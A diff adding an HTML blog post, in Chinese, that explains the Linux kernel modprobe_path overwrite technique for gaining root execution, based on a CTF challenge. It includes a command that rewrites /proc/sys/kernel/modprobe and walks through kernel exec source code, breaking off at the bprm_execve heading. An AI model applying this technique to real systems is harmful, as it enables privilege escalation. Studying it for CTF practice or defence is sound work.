@@ -1,0 +1,1296 @@
+<!DOCTYPE html>
+<html lang="zh" dir="auto" data-theme="auto">
+
+<head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="noindex, nofollow">
+<title>Linux Kernel modprobe_path覆盖利用技术 | 南行&#39;s Blog</title>
+<meta name="keywords" content="">
+<meta name="description" content="前言
+今年的 ccb&amp;ciscn 初赛有一道 Linux 内核的 Pwn 题，让我这个内核菜鸡被直接“硬控”了。现在初赛都上内核了。。。
+赛后搞到了 WP，于是正好趁着元旦假期有时间好好复现一下，分析了一下这道题的利用技术的原理，于是就有了这篇文章。">
+<meta name="author" content="">
+<link rel="canonical" href="http://localhost:1313/posts/linux/modprobe_path/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.06b120a65aeb9368e0ceaf40b7f104e3773d33d49b58d97f1c5e76995fbc7718.css" integrity="sha256-BrEgplrrk2jgzq9At/EE43c9M9SbWNl/HF52mV&#43;8dxg=" rel="preload stylesheet" as="style">
+<link rel="icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="apple-touch-icon" href="http://localhost:1313/assets/favicon.jpg">
+<link rel="mask-icon" href="http://localhost:1313/assets/favicon.jpg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="zh" href="http://localhost:1313/posts/linux/modprobe_path/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --code-block-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+                color-scheme: dark;
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .toc {
+                background: var(--entry);
+            }
+        }
+
+        @media (prefers-color-scheme: light) {
+            .list::-webkit-scrollbar-thumb {
+                border-color: var(--code-bg);
+            }
+        }
+
+    </style>
+</noscript>
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else if (localStorage.getItem("pref-theme") === "light") {
+       document.querySelector("html").dataset.theme = 'light';
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.querySelector("html").dataset.theme = 'dark';
+    } else {
+        document.querySelector("html").dataset.theme = 'light';
+    }
+
+</script><script type="text/javascript"
+        async
+        src="https://cdn.bootcss.com/mathjax/2.7.3/MathJax.js?config=TeX-AMS-MML_HTMLorMML">
+MathJax.Hub.Config({
+  tex2jax: {
+    inlineMath: [['$','$'], ['\\(','\\)']],
+    displayMath: [['$$','$$'], ['\[\[','\]\]']],
+    processEscapes: true,
+    processEnvironments: true,
+    skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+    TeX: { equationNumbers: { autoNumber: "AMS" },
+         extensions: ["AMSmath.js", "AMSsymbols.js"] }
+  }
+});
+
+MathJax.Hub.Queue(function() {
+    
+    
+    
+    var all = MathJax.Hub.getAllJax(), i;
+    for(i = 0; i < all.length; i += 1) {
+        all[i].SourceElement().parentNode.className += ' has-jax';
+    }
+});
+</script>
+
+<style>
+code.has-jax {
+    font: inherit;
+    font-size: 100%;
+    background: inherit;
+    border: inherit;
+    color: #515151;
+}
+</style>
+</head>
+<body id="top">
+    <header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="http://localhost:1313/" accesskey="h" title="南行&#39;s Blog (Alt + H)">南行&#39;s Blog</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)" aria-label="Toggle theme">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="http://localhost:1313/" title="南行&#39;s Blog">
+                    <span>首页</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/archives/" title="归档">
+                    <span>归档</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/categories/" title="Categories">
+                    <span>分类</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/tags/" title="Tags">
+                    <span>标签</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/search/" title="搜索">
+                    <span>搜索</span>
+                </a>
+            </li>
+            <li>
+                <a href="http://localhost:1313/about/" title="About">
+                    <span>关于</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    
+    <h1 class="post-title entry-hint-parent">
+      Linux Kernel modprobe_path覆盖利用技术
+    </h1>
+    <div class="post-meta"><span title='2026-01-01 13:03:38 +0000 UTC'>2026年1月1日</span>
+
+</div>
+  </header> <aside id="toc-container" class="toc-container wide">
+    <div class="toc">
+        <details  open>
+            <summary accesskey="c" title="(Alt + C)">
+                <span class="details">目录</span>
+            </summary>
+
+            <div class="inner"><ul>
+                    <li>
+                        <a href="#%e5%89%8d%e8%a8%80" aria-label="前言">前言</a></li>
+                    <li>
+                        <a href="#%e7%ae%80%e4%bb%8b" aria-label="简介">简介</a></li>
+                    <li>
+                        <a href="#%e5%8e%9f%e7%90%86%e5%88%86%e6%9e%90" aria-label="原理分析">原理分析</a><ul>
+                            
+                    <li>
+                        <a href="#execve" aria-label="execve">execve</a></li>
+                    <li>
+                        <a href="#do_execve" aria-label="do_execve">do_execve</a></li>
+                    <li>
+                        <a href="#do_execveat_common" aria-label="do_execveat_common">do_execveat_common</a></li>
+                    <li>
+                        <a href="#bprm_execve" aria-label="bprm_execve">bprm_execve</a></li>
+                    <li>
+                        <a href="#exec_binprm" aria-label="exec_binprm">exec_binprm</a></li>
+                    <li>
+                        <a href="#search_binary_handler" aria-label="search_binary_handler">search_binary_handler</a></li>
+                    <li>
+                        <a href="#request_module" aria-label="request_module">request_module</a></li>
+                    <li>
+                        <a href="#call_modprobe" aria-label="call_modprobe">call_modprobe</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af%e6%80%bb%e7%bb%93" aria-label="利用思路总结">利用思路总结</a></li>
+                    <li>
+                        <a href="#%e6%bc%8f%e6%b4%9e%e7%bc%93%e8%a7%a3%e6%96%b9%e5%bc%8f" aria-label="漏洞缓解方式">漏洞缓解方式</a></li>
+                    <li>
+                        <a href="#%e4%be%8b%e9%a2%98-ram_snoop" aria-label="例题 ram_snoop">例题 ram_snoop</a><ul>
+                            
+                    <li>
+                        <a href="#%e9%a2%98%e7%9b%ae%e5%88%86%e6%9e%90" aria-label="题目分析">题目分析</a></li>
+                    <li>
+                        <a href="#%e5%88%a9%e7%94%a8%e6%80%9d%e8%b7%af" aria-label="利用思路">利用思路</a></li>
+                    <li>
+                        <a href="#exp" aria-label="exp">exp</a></li></ul>
+                    </li>
+                    <li>
+                        <a href="#%e5%90%8e%e8%a8%80" aria-label="后言">后言</a></li>
+                    <li>
+                        <a href="#%e5%8f%82%e8%80%83" aria-label="参考">参考</a>
+                    </li>
+                </ul>
+            </div>
+        </details>
+    </div>
+</aside>
+<script>
+    let activeElement;
+    let elements;
+    
+    document.addEventListener('DOMContentLoaded', function (event) {
+        checkTocPosition();
+    
+        elements = document.querySelectorAll('h1[id],h2[id],h3[id],h4[id],h5[id],h6[id]');
+        if (elements.length > 0) {
+            
+            activeElement = elements[0];
+            const id = encodeURI(activeElement.getAttribute('id')).toLowerCase();
+            document.querySelector(`.inner ul li a[href="#${id}"]`).classList.add('active');
+        }
+    
+        
+        const topLink = document.getElementById('top-link');
+        if (topLink) {
+            topLink.addEventListener('click', (event) => {
+                
+                event.preventDefault();
+    
+                
+                window.scrollTo({ top: 0, behavior: 'smooth' });
+            });
+        }
+    }, false);
+    
+    window.addEventListener('resize', function(event) {
+        checkTocPosition();
+    }, false);
+    
+    window.addEventListener('scroll', () => {
+        
+        const scrollPosition = window.pageYOffset || document.documentElement.scrollTop;
+    
+        
+        if (scrollPosition === 0) {
+            return;
+        }
+    
+        
+        if (elements && elements.length > 0) {
+            
+            activeElement = Array.from(elements).find((element) => {
+                if ((getOffsetTop(element) - scrollPosition) > 0 && 
+                    (getOffsetTop(element) - scrollPosition) < window.innerHeight / 2) {
+                    return element;
+                }
+            }) || activeElement;
+    
+            elements.forEach(element => {
+                const id = encodeURI(element.getAttribute('id')).toLowerCase();
+                const tocLink = document.querySelector(`.inner ul li a[href="#${id}"]`);
+                if (element === activeElement){
+                    tocLink.classList.add('active');
+    
+                    
+                    const tocContainer = document.querySelector('.toc .inner');
+                    const linkOffsetTop = tocLink.offsetTop;
+                    const containerHeight = tocContainer.clientHeight;
+                    const linkHeight = tocLink.clientHeight;
+    
+                    
+                    const scrollPosition = linkOffsetTop - (containerHeight / 2) + (linkHeight / 2);
+                    tocContainer.scrollTo({ top: scrollPosition, behavior: 'smooth' });
+                } else {
+                    tocLink.classList.remove('active');
+                }
+            });
+        }
+    }, false);
+    
+    const main = parseInt(getComputedStyle(document.body).getPropertyValue('--article-width'), 10);
+    const toc = parseInt(getComputedStyle(document.body).getPropertyValue('--toc-width'), 10);
+    const gap = parseInt(getComputedStyle(document.body).getPropertyValue('--gap'), 10);
+    
+    function checkTocPosition() {
+        const width = document.body.scrollWidth;
+    
+        if (width - main - (toc * 2) - (gap * 4) > 0) {
+            document.getElementById("toc-container").classList.add("wide");
+        } else {
+            document.getElementById("toc-container").classList.remove("wide");
+        }
+    }
+    
+    function getOffsetTop(element) {
+        if (!element.getClientRects().length) {
+            return 0;
+        }
+        let rect = element.getBoundingClientRect();
+        let win = element.ownerDocument.defaultView;
+        return rect.top + win.pageYOffset;   
+    }
+    
+</script>
+  <div class="post-content"><h2 id="前言">前言<a hidden class="anchor" aria-hidden="true" href="#前言">#</a></h2>
+<p>今年的 ccb&amp;ciscn 初赛有一道 Linux 内核的 Pwn 题，让我这个内核菜鸡被直接“硬控”了。现在初赛都上内核了。。。</p>
+<p>赛后搞到了 WP，于是正好趁着元旦假期有时间好好复现一下，分析了一下这道题的利用技术的原理，于是就有了这篇文章。</p>
+<h2 id="简介">简介<a hidden class="anchor" aria-hidden="true" href="#简介">#</a></h2>
+<p><code>modprobe_path</code>覆盖利用技术是一种 Linux 内核漏洞利用方法，它可以让攻击者以 root 权限运行任意 shell 脚本。</p>
+<p><code>modprobe_path</code>覆盖利用技术的关键是覆盖掉<code>modprobe_path</code>内核全局变量，它的默认值为<code>/sbin/modprobe</code>程序的路径，<code>modprobe</code>是一个用于向 Linux 内核添加可加载内核模块，或从内核中移除可加载内核模块的工具。本质上它是一个用户态程序，当我们在 Linux 内核中安装或卸载新模块时会被执行。</p>
+<p>我们可以通过运行以下命令检查：</p>
+<pre tabindex="0"><code>❯ cat /proc/sys/kernel/modprobe
+/sbin/modprobe
+</code></pre><p><code>modprobe_path</code>变量中的程序，会在我们执行一个系统无法识别文件类型的非法格式文件（无效魔数）时被调用。简单说一般我们执行 shell 文件时文件签名是<code>#!/bin/bash</code>，这是合法的文件格式，系统可以识别。而我们执行一个文件签名为<code>\xff\xff\xff\xff</code>的文件时内核会进行一系列操作，最终触发并以 root 权限执行<code>modprobe_path</code>变量中的程序。</p>
+<p>因此如果我们将<code>modprobe_path</code>变量覆盖修改为想要执行的程序，然后再执行一个非法格式文件就可以以 root 权限执行我们想要执行的目标程序。</p>
+<p>但是如果内核开启了<code>CONFIG_STATIC_USERMODEHELPER</code>内核配置选项，那么会将内核执行用户态 helper 的路径从运行时可变的全局变量改为编译期固定的常量，这样我们就无法对<code>modprobe_path</code>进行覆盖修改。</p>
+<p>总结一下<code>modprobe_path</code>覆盖利用技术需要满足以下条件：</p>
+<ol>
+<li>能够任意地址写，可以覆盖<code>modprobe_path</code>变量；</li>
+<li>可以写两个任意文件：
+<ul>
+<li>一个具有非法格式的文件，例如<code>\xff\xff\xff\xff</code>；</li>
+<li>另一个是一个 shell 脚本，用于执行想要以 root 权限完成的操作；</li>
+</ul>
+</li>
+<li>能够执行非法格式文件；</li>
+<li>内核没有启用<code>CONFIG_STATIC_USERMODEHELPER</code>选项。</li>
+</ol>
+<p>基本上，在大多数的 kernel pwn 题目中，条件 2 和条件 3 都是直接满足的，因此最关键的问题在于是否具备任意地址写的能力以及内核是否开启了<code>CONFIG_STATIC_USERMODEHELPER</code>选项。</p>
+<p>询问了一下 GPT 给了一个检查内核是否开启<code>CONFIG_STATIC_USERMODEHELPER</code>选项的方法：</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl"><span class="c1">#修改modprobe</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> /tmp/test &gt; /proc/sys/kernel/modprobe
+</span></span><span class="line"><span class="cl"><span class="c1">#检查是否修改成功</span>
+</span></span><span class="line"><span class="cl">cat /proc/sys/kernel/modprobe
+</span></span></code></pre></div><p>如果修改成功则<code>CONFIG_STATIC_USERMODEHELPER</code>选项未开启，不成功则开启。</p>
+<h2 id="原理分析">原理分析<a hidden class="anchor" aria-hidden="true" href="#原理分析">#</a></h2>
+<p>接下来我们通过分析 Linux 内核的源代码，详细了解覆盖<code>modprobe_path</code>利用技术的原理。</p>
+<p>当我们在 Linux Shell 中执行命令时（例如<code>bash</code>中执行<code>ls</code>），本质上会由 Shell 程序内部调用<code>execve</code>系统调用来加载并执行对应的程序。</p>
+<h3 id="execve">execve<a hidden class="anchor" aria-hidden="true" href="#execve">#</a></h3>
+<p><code>execve</code>系统调用会设置可执行文件路径、命令行参数数组以及环境变量数组等信息，然后调用<code>do_execve</code>，它才是真正负责执行程序加载的核心函数。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">SYSCALL_DEFINE3</span><span class="p">(</span><span class="n">execve</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">    <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span>      	  <span class="c1">// 参数1：可执行文件路径
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="k">const</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span>  <span class="c1">// 参数2：命令行参数数组
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="k">const</span> <span class="n">__user</span> <span class="o">*</span><span class="p">,</span> <span class="n">envp</span><span class="p">)</span>  <span class="c1">// 参数3：环境变量数组
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="nf">do_execve</span><span class="p">(</span><span class="nf">getname</span><span class="p">(</span><span class="n">filename</span><span class="p">),</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span> <span class="c1">//getname从用户态读取filename
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span>
+</span></span></code></pre></div><h3 id="do_execve">do_execve<a hidden class="anchor" aria-hidden="true" href="#do_execve">#</a></h3>
+<p><code>do_execve</code>函数会对传入的可执行文件路径、参数数组和环境变量数组进行封装与处理，然后将执行流程统一转交给 <code>do_execveat_common</code>，由后者完成后续的程序加载与执行逻辑。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">do_execve</span><span class="p">(</span><span class="k">struct</span> <span class="n">filename</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="k">const</span> <span class="n">__user</span> <span class="o">*</span><span class="n">__argv</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="k">const</span> <span class="kt">char</span> <span class="n">__user</span> <span class="o">*</span><span class="k">const</span> <span class="n">__user</span> <span class="o">*</span><span class="n">__envp</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">user_arg_ptr</span> <span class="n">argv</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">ptr</span><span class="p">.</span><span class="n">native</span> <span class="o">=</span> <span class="n">__argv</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">user_arg_ptr</span> <span class="n">envp</span> <span class="o">=</span> <span class="p">{</span> <span class="p">.</span><span class="n">ptr</span><span class="p">.</span><span class="n">native</span> <span class="o">=</span> <span class="n">__envp</span> <span class="p">};</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// AT_FDCWD为当前工作目录
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="k">return</span> <span class="nf">do_execveat_common</span><span class="p">(</span><span class="n">AT_FDCWD</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span> <span class="mi">0</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="do_execveat_common">do_execveat_common<a hidden class="anchor" aria-hidden="true" href="#do_execveat_common">#</a></h3>
+<p><code>do_execveat_common</code>负责构建并填充 <code>linux_binprm</code>，完成命令行参数和环境变量的准备工作。</p>
+<p><code>linux_binprm</code>是 Linux 内核中 描述一个即将被<code>execve</code>执行的可执行文件及其执行上下文的核心数据结构，是<code>execve</code>执行流程中的“载体”，保存了程序加载所需的全部信息。</p>
+<p><code>do_execveat_common</code>最终会调用<code>bprm_execve</code>，进入真正的二进制加载流程。<code>bprm_execve</code>是<code>execve</code>执行路径中最关键的通用入口函数。</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="k">static</span> <span class="kt">int</span> <span class="nf">do_execveat_common</span><span class="p">(</span><span class="kt">int</span> <span class="n">fd</span><span class="p">,</span> <span class="k">struct</span> <span class="n">filename</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			      <span class="k">struct</span> <span class="n">user_arg_ptr</span> <span class="n">argv</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			      <span class="k">struct</span> <span class="n">user_arg_ptr</span> <span class="n">envp</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			      <span class="kt">int</span> <span class="n">flags</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="k">struct</span> <span class="n">linux_binprm</span> <span class="o">*</span><span class="n">bprm</span><span class="p">;</span> <span class="c1">//描述
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	<span class="kt">int</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">IS_ERR</span><span class="p">(</span><span class="n">filename</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">		<span class="k">return</span> <span class="nf">PTR_ERR</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">((</span><span class="n">current</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">PF_NPROC_EXCEEDED</span><span class="p">)</span> <span class="o">&amp;&amp;</span>  <span class="c1">//防止进程数超限仍不断 exec
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>	    <span class="nf">is_rlimit_overlimit</span><span class="p">(</span><span class="nf">current_ucounts</span><span class="p">(),</span> <span class="n">UCOUNT_RLIMIT_NPROC</span><span class="p">,</span> <span class="nf">rlimit</span><span class="p">(</span><span class="n">RLIMIT_NPROC</span><span class="p">)))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">retval</span> <span class="o">=</span> <span class="o">-</span><span class="n">EAGAIN</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">out_ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">current</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">&amp;=</span> <span class="o">~</span><span class="n">PF_NPROC_EXCEEDED</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">bprm</span> <span class="o">=</span> <span class="nf">alloc_bprm</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span> <span class="n">filename</span><span class="p">,</span> <span class="n">flags</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="nf">IS_ERR</span><span class="p">(</span><span class="n">bprm</span><span class="p">))</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">retval</span> <span class="o">=</span> <span class="nf">PTR_ERR</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">out_ret</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">retval</span> <span class="o">=</span> <span class="nf">count</span><span class="p">(</span><span class="n">argv</span><span class="p">,</span> <span class="n">MAX_ARG_STRINGS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="nf">pr_warn_once</span><span class="p">(</span><span class="s">&#34;process &#39;%s&#39; launched &#39;%s&#39; with NULL argv: empty string added</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">			     <span class="n">current</span><span class="o">-&gt;</span><span class="n">comm</span><span class="p">,</span> <span class="n">bprm</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">out_free</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">bprm</span><span class="o">-&gt;</span><span class="n">argc</span> <span class="o">=</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">retval</span> <span class="o">=</span> <span class="nf">count</span><span class="p">(</span><span class="n">envp</span><span class="p">,</span> <span class="n">MAX_ARG_STRINGS</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">out_free</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">bprm</span><span class="o">-&gt;</span><span class="n">envc</span> <span class="o">=</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">retval</span> <span class="o">=</span> <span class="nf">bprm_stack_limits</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">out_free</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">retval</span> <span class="o">=</span> <span class="nf">copy_string_kernel</span><span class="p">(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">filename</span><span class="p">,</span> <span class="n">bprm</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">out_free</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="n">bprm</span><span class="o">-&gt;</span><span class="n">exec</span> <span class="o">=</span> <span class="n">bprm</span><span class="o">-&gt;</span><span class="n">p</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">retval</span> <span class="o">=</span> <span class="nf">copy_strings</span><span class="p">(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">envc</span><span class="p">,</span> <span class="n">envp</span><span class="p">,</span> <span class="n">bprm</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">out_free</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">retval</span> <span class="o">=</span> <span class="nf">copy_strings</span><span class="p">(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">argc</span><span class="p">,</span> <span class="n">argv</span><span class="p">,</span> <span class="n">bprm</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">		<span class="k">goto</span> <span class="n">out_free</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="k">if</span> <span class="p">(</span><span class="n">bprm</span><span class="o">-&gt;</span><span class="n">argc</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="n">retval</span> <span class="o">=</span> <span class="nf">copy_string_kernel</span><span class="p">(</span><span class="s">&#34;&#34;</span><span class="p">,</span> <span class="n">bprm</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="n">retval</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">			<span class="k">goto</span> <span class="n">out_free</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">		<span class="n">bprm</span><span class="o">-&gt;</span><span class="n">argc</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">	<span class="n">retval</span> <span class="o">=</span> <span class="nf">bprm_execve</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span> <span class="c1">//进入真正的执行阶段
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nl">out_free</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">free_bprm</span><span class="p">(</span><span class="n">bprm</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nl">out_ret</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="nf">putname</span><span class="p">(</span><span class="n">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">retval</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><h3 id="bprm_execve">bprm_execve<a hidden class="anchor" aria-hidden="true" href="#bprm_execve">#</a></h3>
